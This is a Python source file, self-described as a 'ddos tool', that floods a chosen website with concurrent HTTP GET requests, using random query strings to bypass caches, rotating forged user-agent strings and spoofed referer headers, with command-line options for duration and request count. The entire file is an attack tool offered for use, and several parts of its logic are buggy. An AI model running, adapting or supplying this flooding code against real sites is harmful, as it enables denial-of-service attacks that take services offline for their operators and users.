# /usr/bin/python
# function : ddos tools
# original author   : firefoxbug
# resurrected by Darkerego

import argparse
import logging
import random
import re
import signal
import sys
import requests
import asyncio
import json
from typing import Union
import aiohttp
logger = logging.getLogger('__main__')
logger.setLevel(0)


class AsyncHttpClient:

    def __init__(self, _headers=None, base_url: str = None, timeout: int | float = 180):
        """
        A skeletal asynchronous HTTP class. Because I found myself writing this same code
        hundreds of times, I decided to just write a reusable module.
        :param _headers:
        :param base_url:
        :param timeout:
        """
        if _headers is None:
            _headers = {}
        self.timeout_secs: int | float = timeout
        self.base_url: str = base_url
        self._session: aiohttp.ClientSession | None = None
        self.is_a_initialized: bool = False
        self.global_headers: dict = _headers

    def update_session_headers(self, key, value):
        self._session.headers.update({key: value})

    async def __ainit__(self):
        """
        async __init__ , this must be awaited to create the client session
        :return:
        """
        timeout = aiohttp.ClientTimeout(total=self.timeout_secs, connect=(self.timeout_secs / 3),
                                        sock_connect=(self.timeout_secs / 3), sock_read=(self.timeout_secs / 3))
        self._session: aiohttp.ClientSession = aiohttp.ClientSession(headers=self.global_headers,
                                                                     base_url=self.base_url,
                                                                     timeout=timeout)
        self.is_a_initialized = True

    async def __aclose__(self):
        await self._session.close()

    async def parse_response(self, response: aiohttp.ClientResponse) -> tuple[int, Union[dict, bytes]]:
        """

        :param response: client response object
        :return: status code, (either json dict, OR bytes if the content was not json)
        """

        status = response.status

        if status >= 200 < 400:
            try:
                resp = await response.json(content_type=None)
            except json.JSONDecodeError:
                resp = await response.read()
        else:
            resp = await response.read()
        return status, resp

    async def post(self, path: str, data=None, headers: dict = {}, verify_ssl: bool = False) -> tuple[
        int, Union[dict, bytes]]:
        """
        HTTP post request
        :param headers:
        :param path: URL
        :param data: payload
        :param verify_ssl: ignore ssl warnings
        :return: status, resp
        """
        if data is None:
            data = {}
        # session: aiohttp.ClientSession = self._session
        async with self._session.post(url=path, json=data, verify_ssl=verify_ssl, headers=headers) as response:
            return await self.parse_response(response)

    async def get(self, path: str, params=None, headers: dict = {}, verify_ssl: bool = False) -> tuple[
        int, Union[dict, bytes]]:
        """
        HTTP GET request
        :param headers:
        :param path: URL
        :param params: query parameters (ie ?&param=value)
        :param verify_ssl: bool
        :return: status, resp
        """
        if params is None:
            params = {}
        async with self._session.get(url=path, params=params, verify_ssl=verify_ssl, headers=headers) as response:
            return await self.parse_response(response)

    async def request(self, method: str, *args, **kwargs) -> tuple[int, Union[dict, bytes]]:
        """
        wrapper function for making requests
        :param method: get, or post
        :param args: arguments
        :param kwargs: keyword arguments
        :return: status, resp
        """
        resp = ''
        status = 0
        if hasattr(self, method.lower()):
            fn = getattr(self, method.lower())
            coro = fn(*args, **kwargs)
            try:
                # resp = self.session.get(url, verify=False)
                status, resp = await coro
            except (aiohttp.ClientResponseError, aiohttp.ClientConnectorError, aiohttp.ServerDisconnectedError,
                    aiohttp.ClientOSError) as err:
                print('[!] HTTP Request error %s' % err)
            except asyncio.exceptions.TimeoutError:
                print('[!] Timed out ...  ')
            except aiohttp.ClientConnectorSSLError as err:
                print('[!] ssl error %s with: ' % err)
            except ValueError as err:
                print('[!] invalid ?: %s' % err)
            finally:
                return status, resp


class State:
    def __init__(self):
        self.running = False

    def start(self):
        self.running = True

    def shutdown(self):
        self.running = False

    @property
    def state(self):
        return self.running


def usage():
    _args = argparse.ArgumentParser(usage='python attack.py [-t] [-c] http://www.baidu.com/')
    _args.add_argument('-t', '--time', default=600.0, type=float,
                       help='Time to run this attack in seconds. Defaults to 10 minutes or 600 seconds.')
    _args.add_argument('-c', '--concurrency', type=int, default=100,
                       help='How many threads to run at once. Uses Semaphore. Defaults to 100.')
    _args.add_argument('-r', '--request-count', dest='request_count', type=int, default=10000,
                       help='The total number of requests to send.')
    _args.add_argument('-v', '--verbosity', action='count', default=0,
                       help='Output verbosity.')

    _args.add_argument('host', type=str, help='The schema and target ip or hostname, ie "https://example.com"')
    _args = _args.parse_args()
    return _args


# generates a user agent array
def useragent_list():
    headers_user_agents = [
        'Mozilla/5.0 X11; U; Linux x86_64; en-US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3',
        'Mozilla/5.0  Windows; U; Windows NT 6.1; en; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0  Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0  Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1',
        'Mozilla/5.0 Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6',
        'Mozilla/4.0  (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
        'Mozilla/4.0  (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/5.0  (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
        'Mozilla/4.0  (compatible; MSIE 6.1; Windows XP)',
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51']
    return headers_user_agents


# generates a referer array
def referer_list(host):
    headers_referrers = [f'http://www.usatoday.com/search/results?q={host}',
                         f'http://engadget.search.aol.com/search?q={host}',
                         f'http://www.google.com/search/results?q={host}']
    return headers_referrers


def handler(signum, _):
    if signum == signal.SIGALRM:
        print("Time is up !")
        print("Attack finished !")
    sys.exit()


class PylorisResurrected:
    def __init__(self, target: str, run_time: int, concurrency: int, request_count: int):
        self.request_count = request_count
        self.target_url = target
        self.run_time = run_time
        self.concurrency = concurrency
        self.client: AsyncHttpClient | None = None
        self.tasks: set = set()

    async def __ainit__(self):
        self.client = AsyncHttpClient()
        await self.client.__ainit__()

    @staticmethod
    def buildblock(size):
        out_str = ''
        for i in range(0, size):
            a = random.randint(65, 90)
            out_str += chr(a)
        return out_str

    async def send_packet(self, _url, _host, _param_joiner):
        if not state.running:
            exit()
        request = requests.Request('get',
                                   url=_url + _param_joiner + self.buildblock(
                                       random.randint(3, 10)) + '=' + self.buildblock(random.randint(3, 10)))
        request.headers = {'User-Agent': random.choice(useragent_list()), 'Cache-Control': 'no-cache',
                           'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
                           'Referer': random.choice(referer_list(_host)) + self.buildblock(random.randint(5, 10)),
                           'Keep-Alive': str(random.randint(110, 120)), 'Connection': 'keep-alive',
                           'Host': _host}
        # print('headers', request.headers)
        request = request.prepare()
        print(request.__dict__)
        # response = None
        # s = 0
        s, response = await self.client.request(method='get', path=url, headers=request.headers)
        try:
            pass
        except requests.exceptions.ConnectionError as err:
            print('[!] HTTP Client Error: %s, status code: %s' % (err, s))
            await asyncio.sleep(0.1)
            # return 0, b""
        except Exception as err:
            print(err)
        else:
            return s, response
        finally:
            print('%s:%s' % (s, response))
            if s >= 200 < 400:
                return s, True
            return s, False


async def main(_args: argparse.Namespace):
    print('main', _args.__str__())

    await pyloris.__ainit__()
    for x in range(1, pyloris.request_count + 1):
        task = asyncio.create_task(pyloris.send_packet(pyloris.target_url, args.host, args.param_joiner))
        task.add_done_callback(pyloris.tasks.discard)
        pyloris.tasks.add(task)

    print('[+] Firing %s requests: ' % (len(pyloris.tasks)))
    async with asyncio.Semaphore(_args.concurrency):
        results = await asyncio.gather(*pyloris.tasks)

        [print(r, sep=', ', end='') for r in results]
        print()
    await pyloris.client.__aclose__()


if __name__ == '__main__':
    state = State()
    url = None
    args = usage()
    print(vars(args))
    if not args.host:
        print('Specify a URL')
        exit(1)
    print("Debug : thread=%d time=%d %s" % (int(args.concurrency), int(args.time), args.host))
    if args.host.count('/') == 2:
        url = args.host + "/"
    args.url = url
    m = re.search('http://([^/]*)/?.*', args.host)
    if m is None:
        m = re.search('https://([^/]*)/?.*', args.host)
        if m is None:
            print('[!] Malformed URL. Syntax is schema://hostname.tld, or '
                  'for example: http://msn.com or https://cnn.com')
            exit()
    args.target_url = args.host
    args.host = m.group(1)
    args.schema = args.target_url.split(args.host)[0]

    users_agents = useragent_list()
    refs = referer_list(args.host)

    if url.count("?") > 0:
        args.param_joiner = "&"
    else:
        args.param_joiner = "?"

    signal.signal(signal.SIGINT, handler)
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(int(args.time))
    pyloris = PylorisResurrected(args.target_url, args.time, args.concurrency, args.request_count)
    state.start()
    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print('Shutting down ... ')
        state.shutdown()
